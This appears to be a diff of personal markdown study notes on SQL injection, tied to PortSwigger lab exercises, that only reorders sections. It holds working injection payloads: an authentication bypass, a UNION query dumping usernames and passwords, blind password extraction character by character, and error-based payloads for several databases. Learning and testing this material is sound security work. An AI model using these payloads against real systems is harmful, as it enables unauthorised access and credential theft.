@@ -7,76 +7,6 @@
 time-delay payloads
 triggering out-of-band network interaction
 ```
-
-## Examples
-### Retrievieng hidden data
-`https://insecure-website.com/products?category=Gifts`
-When user clicks on the *Gifts* category, browser requests URL from above  
-SQL query:
-`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
-Here *released* means that product is released and could be viewed by users. If we change released value to 0, we will be able to see all the products  
-URL:
-`https://insecure-website.com/products?category=Gifts'--`
-Query:
-`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
-Or we can use next query:
-`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
-And the query will be:
-`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
-1=1 returns True, so query will return all product from category *Gifts*
-
-### Subverting application logic
-If user sends login wiener and pass bluecheese, app will let him in  
-Query:
-`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
-If we enter `administrator'--` we will get in as administrator without checking password, because query will be next:
-`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
-
-### Retrieving data from other database tables
-```
-SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--
-```
-
-### Blind SQL injections
-* Triggered by changing logic of query (boolean results, divide-by-zero etc)
-* Time delay of processing query
-* Out-of-band network ineraction
-
-#### Conditional responses
-Example:  
-Site uses tracking cookies with some token which is compared to tokens in DB and if it appears to be there, site returns hello message  
-If we add `AND '1'='1` nothing will change because it's True statement  
-But if we add `AND '1'='2` it will fail and we will detect Blind SQLi  
-We can use it to brute password symbol by symbol like this:
-```
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm        #returns True, meaning that 1 symbol of pass is greater then m
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't        #returns False, meaning that 1 symbol of pass is less then t
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's        #returns True, meaning that 1 symbol of pass is s
-```
-Note: SUBSTRING() function could be named SUBSTR() on some DBs  
-To check next symbol use SUBSTRING((...), 2, 1)  
-it's good idea to use Burp Intruder or Python script
-
-#### Error-based SQLi
-In such case we force DB to do smth which throws an error  
-For example we can force DB to try divide-by-zero:
-```
-xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a          # nothing happens, because 1=2 is False and we just evaluate a to a
-xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a          # we force DB to 1/0 because 1=1 is True
-```
-```
-xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
-```
-In such case if 1 character of password is more then 'm', nothing happens. But if it's smaller, we force DB to 1/0, which throws an error  
-For different DBs:
-* Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual `
-* Microsoft: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END `
-* Postgres: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
-* MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
-
-### Second-order SQLi
-SQLi which is stored inside server/database and executed later with another HTTP request. Also called stored SQLi  
-
 ## Examining database
 ### Versions:
 * Oracle DB version: `SELECT * FROM v$version`
@@ -120,6 +50,35 @@ If wee see that SQLi returns only one column, we can concatenate like this:
 
 REPEAT THIS [LAB](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 
+## Examples
+### Retrievieng hidden data
+`https://insecure-website.com/products?category=Gifts`
+When user clicks on the *Gifts* category, browser requests URL from above  
+SQL query:
+`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+Here *released* means that product is released and could be viewed by users. If we change released value to 0, we will be able to see all the products  
+URL:
+`https://insecure-website.com/products?category=Gifts'--`
+Query:
+`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
+Or we can use next query:
+`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
+And the query will be:
+`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
+1=1 returns True, so query will return all product from category *Gifts*
+
+### Subverting application logic
+If user sends login wiener and pass bluecheese, app will let him in  
+Query:
+`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
+If we enter `administrator'--` we will get in as administrator without checking password, because query will be next:
+`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
+
+### Retrieving data from other database tables
+```
+SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--
+```
+
 ## UNION SQLi
 ### Determining the number of columns
 order by method:
@@ -154,4 +113,48 @@ Other DBs:
 * Microsoft: `'foo'+'bar'`
 * Postgres: `'foo'||'bar'`
 * MySQL: `'foo' 'bar'` (note the space) or `CONCAT('foo','bar')`
+
+### Blind SQL injections
+* Triggered by changing logic of query (boolean results, divide-by-zero etc)
+* Time delay of processing query
+* Out-of-band network ineraction
+
+#### Conditional responses
+Example:  
+Site uses tracking cookies with some token which is compared to tokens in DB and if it appears to be there, site returns hello message  
+If we add `AND '1'='1` nothing will change because it's True statement  
+But if we add `AND '1'='2` it will fail and we will detect Blind SQLi  
+We can use it to brute password symbol by symbol like this:
+```
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm        #returns True, meaning that 1 symbol of pass is greater then m
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't        #returns False, meaning that 1 symbol of pass is less then t
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's        #returns True, meaning that 1 symbol of pass is s
+```
+Note: SUBSTRING() function could be named SUBSTR() on some DBs  
+To check next symbol use SUBSTRING((...), 2, 1)  
+it's good idea to use Burp Intruder or Python script
+
+#### Error-based SQLi
+In such case we force DB to do smth which throws an error  
+For example we can force DB to try divide-by-zero:
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a          # nothing happens, because 1=2 is False and we just evaluate a to a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a          # we force DB to 1/0 because 1=1 is True
+```
+```
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+In such case if 1 character of password is more then 'm', nothing happens. But if it's smaller, we force DB to 1/0, which throws an error  
+For different DBs:
+* Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual `
+* Microsoft: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END `
+* Postgres: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
+* MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
+
+### Second-order SQLi
+SQLi which is stored inside server/database and executed later with another HTTP request. Also called stored SQLi  
+
+
+
+
 
